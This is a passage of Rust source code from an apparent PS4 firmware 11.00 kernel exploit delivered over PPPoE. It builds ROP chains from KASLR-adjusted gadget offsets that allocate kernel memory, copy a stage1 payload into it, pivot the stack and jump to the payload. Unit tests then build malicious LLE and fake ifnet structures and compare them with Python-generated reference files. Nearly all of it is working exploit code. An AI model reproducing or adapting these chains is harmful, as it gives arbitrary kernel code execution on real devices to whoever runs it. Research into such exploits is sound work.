    // kmem_alloc(*kernel_map, PAGE_SIZE)
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rax_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdi_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.kernel_map).to_le_bytes());
    rop.extend(
        &(kaslr_offset + OFFSETS_FW_1100.mov_rdi_qword_ptr_rdi_pop_rbp_jmp_rax).to_le_bytes(),
    );
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());

    // RSI = PAGE_SIZE
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rsi_ret).to_le_bytes());
    rop.extend(&(constants::PAGE_SIZE).to_le_bytes());

    // Call kmem_alloc
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.kmem_alloc).to_le_bytes());

    // R14 = RAX
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_r8_pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rbp_ret).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_r14_rax_call_r8).to_le_bytes());

    // memcpy(R14, stage1, len(stage1))
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_r12_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_rdi_r14_call_r12).to_le_bytes());

    // RSI = RSP + len(rop) - rop_rsp_pos
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.push_rsp_pop_rsi_ret).to_le_bytes());
    let rop_rsp_pos = rop.len();
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdx_ret).to_le_bytes());
    let rop_off_fixup = rop.len();
    rop.extend(&0xDEADBEEF_u64.to_le_bytes()); // Placeholder
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.sub_rsi_rdx_mov_rax_rsi_pop_rbp_ret).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());

    // RDX = len(stage1)
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdx_ret).to_le_bytes());
    rop.extend(&(stage1_len as u64).to_le_bytes());

    // Call memcpy
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.memcpy).to_le_bytes());

    // Jump into stage1
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.jmp_r14).to_le_bytes());

    // Fixup offset of stage1
    let stage1_fixup_value = -((rop.len() - rop_rsp_pos) as i64);
    rop[rop_off_fixup..rop_off_fixup + 8].copy_from_slice(&stage1_fixup_value.to_le_bytes());

    rop
}

pub fn build_first_rop(
    stage1_len: usize,
    fake_lle: &[u8],
    rop2: &[u8],
    kaslr_offset: u64,
) -> Vec<u8> {
    let mut rop = Vec::new();

    // RDI = RBX - 0x800
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_r12_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_rdi_rbx_call_r12).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rcx_ret).to_le_bytes());
    rop.extend(&(-0x800i64).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.add_rdi_rcx_ret).to_le_bytes());

    // RSI += len(fake_lle + rop)
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdx_ret).to_le_bytes());
    let rop_off_fixup = rop.len();
    rop.extend(&0xDEADBEEF_u64.to_le_bytes()); // Placeholder
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.sub_rsi_rdx_mov_rax_rsi_pop_rbp_ret).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());

    // RDX = len(rop2 + stage1)
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdx_ret).to_le_bytes());
    rop.extend(&(rop2.len() + stage1_len).to_le_bytes());

    // Call memcpy
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.memcpy).to_le_bytes());

    // Stack pivot
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rax_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_rsi_rbx_call_rax).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdx_ret).to_le_bytes());
    rop.extend(&(0x800u64 + 0x20u64).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.sub_rsi_rdx_mov_rax_rsi_pop_rbp_ret).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.lea_rsp_rsi_20_repz_ret).to_le_bytes());

    // Fixup offset of rop2
    let len_fixup = fake_lle.len() + rop.len();
    let fixup_value = -(len_fixup as i64);
    rop[rop_off_fixup..rop_off_fixup + 8].copy_from_slice(&fixup_value.to_le_bytes());

    rop
}

#[cfg(test)]
mod tests {

    use crate::exploit;

    use super::*;
    use pcap::Capture;

    fn get_test_ps4_mac() -> [u8; 6] {
        [0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]
    }

    fn get_test_host_mac() -> [u8; 6] {
        [0x07, 0x2c, 0xf6, 0x06, 0xba, 0x9b]
    }

    fn get_test_host_unique() -> [u8; 8] {
        [0x00, 0x2c, 0xf6, 0x06, 0xba, 0x9b, 0xff, 0xff]
    }

    #[test]
    fn test_extract_host_uniq() {
        // Open the pcap file
        let mut cap = Capture::from_file("test_data/initial_two_padi.pcap")
            .expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_host_uniq(&packet) {
                    Ok(host_uniq) => {
                        println!("Extracted Host-Uniq: {:?}", host_uniq);
                        println!("Extracted Host-Uniq: {:?}", u64::from_be_bytes(host_uniq));
                        // Print the value as hexadecimal
                        println!(
                            "Converted value in hex: 0x{:016x}",
                            u64::from_be_bytes(host_uniq)
                        );

                        // Assert that the Host-Uniq value has the expected length
                        assert_eq!(host_uniq.len(), 8);
                        assert_eq!(u64::from_be_bytes(host_uniq), 0x002cf606ba9bffff)
                    }
                    Err(e) => {
                        panic!("Failed to extract Host-Uniq: {:?}", e);
                    }
                }
            }
        }
    }

    #[test]
    fn test_extract_source_mac() {
        // Open the pcap file
        let mut cap = Capture::from_file("test_data/initial_two_padi.pcap")
            .expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_ps4_mac(&packet) {
                    Ok(source_mac) => {
                        println!("Extracted Source MAC Address: {:?}", source_mac);
                        // Assert that the MAC address has the expected length
                        assert_eq!(source_mac.len(), 6);
                        // Optionally, check the MAC address values
                        assert_eq!(&source_mac, &[0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]);
                    }
                    Err(e) => {
                        panic!("Failed to extract Source MAC Address: {:?}", e);
                    }
                }
            }
        }
    }

    use super::*;
    use std::fs::File;
    use std::io::Read;
    use std::io::Write;
    use std::io::{self};

    fn read_stage(file_path: &str) -> io::Result<Vec<u8>> {
        let mut file = File::open(file_path)?;
        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer)?;
        Ok(buffer) // Return the buffer
    }

    #[test]
    fn test_fake_ifnet_comparison() {
        // Generate fake ifnet using the Rust implementation
        let mut expl = Exploit {
            source_mac: [0; 6], // Using array initialization
            target_mac: [0; 6],
            pppoe_softc: 0,
            host_uniq: [0; 8],
            target_ipv6: [0; 16],
            source_ipv6: [0; 16],
            kaslr_offset: 0,
            stage1: vec![0],
            stage2: vec![0],
        };

        expl.pppoe_softc = 0x123456789ABCDEF0;
        let rust_fake_ifnet = expl.build_fake_ifnet();

        // Dump the fake ifnet to a file
        let mut rust_file =
            File::create("test_data/rust_fake_ifnet.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_ifnet)
            .expect("Failed to write to file");

        // Load the fake ifnet generated by Python
        let mut python_fake_ifnet = Vec::new();
        let mut python_file =
            File::open("test_data/fake_ifnet.bin").expect("Failed to open Python fake ifnet file");
        python_file
            .read_to_end(&mut python_fake_ifnet)
            .expect("Failed to read Python fake ifnet file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_ifnet.len(),
            python_fake_ifnet.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_fake_ifnet
            .iter()
            .zip(python_fake_ifnet.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_overflow_lle_comparison() {
        // Generate malicious LLE using the Rust implementation
        let pppoe_softc: u64 = 0xffffea374898a600; // Initial pppoe
        let rust_overflow_lle = build_overflow_lle(pppoe_softc);

        // Dump the malicious LLE to a file
        let mut rust_file =
            File::create("test_data/rust_overflow_lle.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_overflow_lle)
            .expect("Failed to write to file");

        // Load the malicious LLE generated by Python
        let mut python_overflow_lle = Vec::new();
        let mut python_file =
            File::open("test_data/overflow_lle.bin").expect("Failed to open Python LLE file");
        python_file
            .read_to_end(&mut python_overflow_lle)
            .expect("Failed to read Python LLE file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_overflow_lle.len(),
            python_overflow_lle.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_overflow_lle
            .iter()
            .zip(python_overflow_lle.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_fake_lle_comparison() {
        // Generate fake LLE using the Rust implementation
        let mut expl = Exploit {
            source_mac: [0; 6], // Using array initialization
            target_mac: [0; 6],
            pppoe_softc: 0,
            host_uniq: [0; 8],
            target_ipv6: [0; 16],
            source_ipv6: [0; 16],
            kaslr_offset: 0,
            stage1: vec![0],
            stage2: vec![0],
        };

        expl.kaslr_offset = 0x1eca4000;
        expl.stage1 = read_stage("stage1/stage1.bin").unwrap();
        expl.pppoe_softc = 0xffff9bba06f62c00;

        let rust_fake_lle = expl.build_fake_lle();

        // Dump the malicious LLE to a file
        let mut rust_file =
            File::create("test_data/rust_fake_lle.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_lle)
            .expect("Failed to write to file");

        // Load the malicious LLE generated by Python
        let mut python_fake_lle = Vec::new();
        let mut python_file =
            File::open("test_data/fake_lle.bin").expect("Failed to open Python LLE file");
        python_file
            .read_to_end(&mut python_fake_lle)
            .expect("Failed to read Python LLE file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_lle.len(),
            python_fake_lle.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in
            rust_fake_lle.iter().zip(python_fake_lle.iter()).enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_read_stage() {
        let stage2: Vec<u8> = read_stage("stage2/stage2.bin").unwrap();
        assert_eq!(stage2.len(), 2705);
    }

    #[test]
    fn test_fragment() {
        let stage2: Vec<u8> = read_stage("stage2/stage2.bin").unwrap();
        let frags = fragment(stage2);
        assert_eq!(frags.len(), 3);
    }
}
